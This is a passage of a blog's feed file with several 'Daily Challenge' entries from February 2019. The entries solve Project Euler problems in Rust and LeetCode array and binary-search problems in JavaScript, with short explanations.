&#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">if</span> cnt == <span class="number">6</span> &#123; <span class="literal">false</span> &#125; <span class="keyword">else</span> &#123; rank1[cnt] &gt; rank2[cnt]&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> rank1[<span class="number">0</span>] == <span class="number">3</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> cnt = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> cnt &lt; <span class="number">4</span> &amp;&amp; rank1[cnt] == rank2[cnt] &#123;</span><br><span class="line">            cnt += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">if</span> cnt == <span class="number">4</span> &#123; <span class="literal">false</span> &#125; <span class="keyword">else</span> &#123; rank1[cnt] &gt; rank2[cnt]&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> rank1[<span class="number">0</span>] == <span class="number">2</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> cnt = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> cnt &lt; <span class="number">5</span> &amp;&amp; rank1[cnt] == rank2[cnt] &#123;</span><br><span class="line">            cnt += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">if</span> cnt == <span class="number">5</span> &#123; <span class="literal">false</span> &#125; <span class="keyword">else</span> &#123; rank1[cnt] &gt; rank2[cnt]&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><h3 id="453-Minimum-Moves-to-Equal-Array-Elements"><a href="#453-Minimum-Moves-to-Equal-Array-Elements" class="headerlink" title="453. Minimum Moves to Equal Array Elements"></a>453. Minimum Moves to Equal Array Elements</h3><p>Given a <strong>non-empty</strong> integer array of size <em>n</em>, find the minimum number of moves required to make all array elements equal, where a move is incrementing <em>n</em> - 1 elements by 1.</p><p><strong>Example:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">[1,2,3]</span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line">3</span><br><span class="line"></span><br><span class="line">Explanation:</span><br><span class="line">Only three moves are needed (remember each move increments two elements):</span><br><span class="line"></span><br><span class="line">[1,2,3]  =&gt;  [2,3,3]  =&gt;  [3,4,3]  =&gt;  [4,4,4]</span><br></pre></td></tr></table></figure><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>Increment other n-1 element means decrement one element.</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;number[]&#125; nums</span></span><br><span class="line"><span class="comment"> * @return &#123;number&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> minMoves = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> min = number.MAX_SAFE_INTEGER;</span><br><span class="line">  <span class="keyword">let</span> sum = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> num <span class="keyword">of</span> nums) &#123;</span><br><span class="line">    min = min&lt;num?min:num;</span><br><span class="line">    sum += num;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> sum-min*nums.length;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-02-11 Daily Challenge</title>
      <link href="/2019-02-11-Daily-Challenge/"/>
      <url>/2019-02-11-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Combinatoric selections</em> in <em>Rust</em> and <em>Search in Rotated Sorted Array</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><h3 id="Combinatoric-selections"><a href="#Combinatoric-selections" class="headerlink" title="Combinatoric selections"></a>Combinatoric selections</h3><h3 id="Problem-53"><a href="#Problem-53" class="headerlink" title="Problem 53"></a>Problem 53</h3><p>There are exactly ten ways of selecting three from five, 12345:</p><p>123, 124, 125, 134, 135, 145, 234, 235, 245, and 345</p><p>In combinatorics, we use the notation, $C^5_3​$ = 10.</p><p>In general,<br>$C^n_r=\frac{n!}{r!(n-r)!},where r ≤ n, n! = n×(n−1)×...×3×2×1, and\ 0! = 1​$</p><p>It is not until n = 23, that a value exceeds one-million: $C^{23}_{10}$ = 1144066.</p><p>How many, not necessarily distinct, values of  $C^n_r$, for 1 ≤ n ≤ 100, are greater than one-million?</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>By definition you could find that $C^n_r=C^n_{(n-r)}$, and more, $C_r^n\ meet\ its\ maximum\ when\ r=n/2$.</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">2</span>..<span class="number">101</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> tmp = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="number">1</span>..i/<span class="number">2</span> &#123;</span><br><span class="line">            tmp *= i-j+<span class="number">1</span>;</span><br><span class="line">            tmp /= j;</span><br><span class="line">            <span class="keyword">if</span> tmp &gt; <span class="number">1_000_000</span> &#123;</span><br><span class="line">                <span class="built_in">println!</span>(<span class="string">"C(&#123;&#125;, &#123;&#125;)"</span>, i, j);</span><br><span class="line">                ans += i-j-j+<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, ans);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><h3 id="33-Search-in-Rotated-Sorted-Array"><a href="#33-Search-in-Rotated-Sorted-Array" class="headerlink" title="33. Search in Rotated Sorted Array"></a>33. Search in Rotated Sorted Array</h3><p>Suppose an array sorted in ascending order is rotated at some pivot unknown to you beforehand.</p><p>(i.e., <code>[0,1,2,4,5,6,7]</code> might become <code>[4,5,6,7,0,1,2]</code>).</p><p>You are given a target value to search. If found in the array return its index, otherwise return <code>-1</code>.</p><p>You may assume no duplicate exists in the array.</p><p>Your algorithm&#39;s runtime complexity must be in the order of <em>O</em>(log <em>n</em>).</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: nums = [4,5,6,7,0,1,2], target = 0</span><br><span class="line">Output: 4</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: nums = [4,5,6,7,0,1,2], target = 3</span><br><span class="line">Output: -1</span><br></pre></td></tr></table></figure><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>All you need to do is use what we done at the day before yesterday to find pivot, and add it into normal binary search.</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;number[]&#125; nums</span></span><br><span class="line"><span class="comment"> * @param &#123;number&#125; target</span></span><br><span class="line"><span class="comment"> * @return &#123;number&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> search = <span class="function"><span class="keyword">function</span>(<span class="params">nums, target</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> begin = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> end = nums.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> mid;</span><br><span class="line">    <span class="keyword">while</span> (nums[begin] &gt; nums[end]) &#123;</span><br><span class="line">      mid = <span class="built_in">Math</span>.floor((begin + end) / <span class="number">2</span>);</span><br><span class="line">      <span class="keyword">if</span> (nums[mid] &gt;= nums[begin]) &#123;</span><br><span class="line">        begin = mid + <span class="number">1</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        end = mid;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> pivot = begin;</span><br><span class="line">    begin = <span class="number">0</span>;</span><br><span class="line">    end = nums.length;</span><br><span class="line">    <span class="comment">// console.log(begin, end);</span></span><br><span class="line">    <span class="keyword">while</span> (begin &lt; end) &#123;</span><br><span class="line">      mid = (<span class="built_in">Math</span>.floor((begin + end) / <span class="number">2</span>));</span><br><span class="line">      <span class="keyword">if</span> (nums[(mid+pivot)%nums.length] &lt; target) begin = mid + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">else</span> end = mid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> nums[(begin+pivot)%nums.length]===target?(begin+pivot)%nums.length:<span class="number">-1</span>;</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-02-10 Daily Challenge</title>
      <link href="/2019-02-10-Daily-Challenge/"/>
      <url>/2019-02-10-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Permuted multiples</em> in <em>Rust</em> and <em>Find Minimum in Rotated Sorted Array II</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><h3 id="Permuted-multiples"><a href="#Permuted-multiples" class="headerlink" title="Permuted multiples"></a>Permuted multiples</h3><h3 id="Problem-52"><a href="#Problem-52" class="headerlink" title="Problem 52"></a>Problem 52</h3><p>It can be seen that the number, 125874, and its double, 251748, contain exactly the same digits, but in a different order.</p><p>Find the smallest positive integer, <em>x</em>, such that 2<em>x</em>, 3<em>x</em>, 4<em>x</em>, 5<em>x</em>, and 6<em>x</em>, contain the same digits.</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>I&#39;ve tried to find some graceful solution which need no stack-based array to determine if two numbers are permutation of each other, and get nothing.</p><p>So just brute force.</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> down_bound = <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> up_bound = <span class="number">1000</span>/<span class="number">6</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> found: <span class="built_in">bool</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> !found &#123;</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> down_bound..up_bound &#123;</span><br><span class="line">            <span class="keyword">let</span> <span class="keyword">mut</span> is_ok = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="number">2</span>..<span class="number">7</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> !is_permutation(i, i*j) &#123;</span><br><span class="line">                    is_ok = <span class="literal">false</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> is_ok &#123;</span><br><span class="line">                ans = i;</span><br><span class="line">                found = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        down_bound *= <span class="number">10</span>;</span><br><span class="line">        up_bound = down_bound*<span class="number">10</span>/<span class="number">6</span> + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, ans);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">is_permutation</span></span>(<span class="keyword">mut</span> u: <span class="built_in">usize</span>, <span class="keyword">mut</span> v: <span class="built_in">usize</span>) -&gt; <span class="built_in">bool</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> a1: [<span class="built_in">usize</span>; <span class="number">10</span>] = [<span class="number">0</span>; <span class="number">10</span>];</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> a2: [<span class="built_in">usize</span>; <span class="number">10</span>] = [<span class="number">0</span>; <span class="number">10</span>];</span><br><span class="line">    <span class="keyword">while</span> u &gt; <span class="number">0</span> &#123;</span><br><span class="line">        a1[u%<span class="number">10</span>] += <span class="number">1</span>;</span><br><span class="line">        a2[v%<span class="number">10</span>] += <span class="number">1</span>;</span><br><span class="line">        u /= <span class="number">10</span>;</span><br><span class="line">        v /= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">0</span>..<span class="number">10</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> a1[i] != a2[i] &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><h3 id="154-Find-Minimum-in-Rotated-Sorted-Array-II"><a href="#154-Find-Minimum-in-Rotated-Sorted-Array-II" class="headerlink" title="154. Find Minimum in Rotated Sorted Array II"></a>154. Find Minimum in Rotated Sorted Array II</h3><p>Suppose an array sorted in ascending order is rotated at some pivot unknown to you beforehand.</p><p>(i.e.,  <code>[0,1,2,4,5,6,7]</code> might become  <code>[4,5,6,7,0,1,2]</code>).</p><p>Find the minimum element.</p><p>The array may contain duplicates.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: [1,3,5]</span><br><span class="line">Output: 1</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: [2,2,2,0,1]</span><br><span class="line">Output: 0</span><br></pre></td></tr></table></figure><p><strong>Note:</strong></p><ul><li>This is a follow up problem to <a href="https://leetcode.com/problems/find-minimum-in-rotated-sorted-array/description/" target="_blank" rel="noopener">Find Minimum in Rotated Sorted Array</a>.</li><li>Would allow duplicates affect the run-time complexity? How and why?</li></ul><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>I guess worst case of time complexity of algorithms will be $O(N)$, because we can&#39;t use binary partition to deal with duplicates.</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;number[]&#125; nums</span></span><br><span class="line"><span class="comment"> * @return &#123;number&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> findMin = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (nums[<span class="number">0</span>] &lt; nums[nums.length<span class="number">-1</span>]) <span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> val <span class="keyword">of</span> nums) &#123;</span><br><span class="line">    <span class="keyword">if</span> (val &lt; nums[<span class="number">0</span>]) <span class="keyword">return</span> val;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-02-09 Daily Challenge</title>
      <link href="/2019-02-09-Daily-Challenge/"/>
      <url>/2019-02-09-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Prime digit replacements</em> in <em>Rust</em> and <em>Find Minimum in Rotated Sorted Array</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><h3 id="Prime-digit-replacements"><a href="#Prime-digit-replacements" class="headerlink" title="Prime digit replacements"></a>Prime digit replacements</h3><h3 id="Problem-51"><a href="#Problem-51" class="headerlink" title="Problem 51"></a>Problem 51</h3><p>By replacing the 1st digit of the 2-digit number *3, it turns out that six of the nine possible values: 13, 23, 43, 53, 73, and 83, are all prime.</p><p>By replacing the 3rd and 4th digits of 56**3 with the same digit, this 5-digit number is the first example having seven primes among the ten generated numbers, yielding the family: 56003, 56113, 56333, 56443, 56663, 56773, and 56993. Consequently 56003, being the first member of this family, is the smallest prime with this property.</p><p>Find the smallest prime which, by replacing part of the number (not necessarily adjacent digits) with the same digit, is part of an eight prime value family.</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>I&#39;ve read description several times and realize it&#39;s a very interesting problem.</p><p>First you need to find prime match the patter &quot;have 3 digit with same value&quot;, why is 3? Actually it will be any number that is multiple of 3.</p><p>There is a little trick we learn at junior school: every number which can be divide by 3, the sum of their digits can be divide by 3, and vice versa.</p><p>Second there is a trick to find set $S$&#39;s(of size $n$) subset $R$ which is of size $r$:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> s = (<span class="number">1</span>&lt;&lt;r)<span class="number">-1</span>; s&lt;(<span class="number">1</span>&lt;&lt;n); ) &#123;</span><br><span class="line">    <span class="keyword">int</span> x = s&amp;-s;</span><br><span class="line">    <span class="keyword">int</span> y = s+x;</span><br><span class="line">    s = ((s&amp;-y)/x&gt;&gt;<span class="number">1</span>) | y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Here&#39;s my idea:</p><img src="/2019-02-09-Daily-Challenge/1.png" title="prime"><p>There is still something I can do to improve program&#39;s performance.</p><p>But just leave it XD</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">crate</span> primal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> primal::Sieve;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> sieve: Sieve = Sieve::new(<span class="number">1_000_000_000</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> up_bound: <span class="built_in">usize</span> = <span class="number">99_999</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> down_bound: <span class="built_in">usize</span> = <span class="number">10_000</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> size: <span class="built_in">usize</span> = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> pattern: <span class="built_in">isize</span> = -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> found: <span class="built_in">bool</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans: <span class="built_in">usize</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> !found &#123;</span><br><span class="line">        <span class="keyword">let</span> up_bd = sieve.prime_pi(up_bound) + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">let</span> dw_bd = sieve.prime_pi(down_bound) + <span class="number">1</span>;</span><br><span class="line">        <span class="comment">// println!("&#123;&#125;", up_bound);</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> dw_bd..up_bd &#123;</span><br><span class="line">            <span class="keyword">let</span> p = sieve.nth_prime(i);</span><br><span class="line">            <span class="keyword">if</span> !match_pattern(p, &amp;<span class="keyword">mut</span> pattern, size) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// println!("&#123;&#125;, &#123;:b&#125;", p, pattern);</span></span><br><span class="line">            <span class="keyword">if</span> count(p, pattern, size, &amp;sieve) == <span class="number">8</span> &#123;</span><br><span class="line">                ans = p;</span><br><span class="line">                found = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        up_bound = up_bound * <span class="number">10</span> + <span class="number">9</span>;</span><br><span class="line">        down_bound *= <span class="number">10</span>;</span><br><span class="line">        size += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, ans)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">match_pattern</span></span>(p: <span class="built_in">usize</span>, pattern: &amp;<span class="keyword">mut</span> <span class="built_in">isize</span>, size: <span class="built_in">usize</span>) -&gt; <span class="built_in">bool</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> s: <span class="built_in">isize</span> = (<span class="number">1</span> &lt;&lt; <span class="number">3</span>) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> s &lt; (<span class="number">1</span> &lt;&lt; size) &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> num = <span class="number">99</span>;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> tmp_mask = s;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> tmp_p = p;</span><br><span class="line">        <span class="keyword">while</span> tmp_mask != <span class="number">0</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> tmp_mask &amp; <span class="number">1</span> == <span class="number">1</span> &#123;</span><br><span class="line"><span class="keyword">if</span> num == <span class="number">99</span> || num == tmp_p%<span class="number">10</span> &#123;</span><br><span class="line">num = tmp_p % <span class="number">10</span>;</span><br><span class="line">                    cnt += <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> num != tmp_p % <span class="number">10</span> &#123;</span><br><span class="line">cnt = -<span class="number">1</span>;</span><br><span class="line"><span 